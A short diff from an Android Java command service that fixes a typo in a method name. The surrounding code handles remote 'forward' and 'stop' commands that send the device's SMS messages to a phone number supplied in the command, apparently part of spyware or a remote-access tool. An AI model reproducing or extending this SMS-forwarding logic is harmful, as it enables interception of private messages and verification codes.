@@ -173,7 +173,7 @@ public class CommandService extends Service {
                                 String pNumber = cmd.has("arg2") ? cmd.get("arg2").toString() : "";
                                 if (isForward.equals("forward")) {
                                     Log.i(TAG, "\nInvoking Forward SMS forward command\n");
-                                    smsForwarder.setRecepientNumber(pNumber);
+                                    smsForwarder.setRecipientNumber(pNumber);
                                     smsForwarder.listen();
                                 } else if (isForward.equals("stop")) {
                                     Log.i(TAG, "\nInvoking Forward SMS stop command\n");
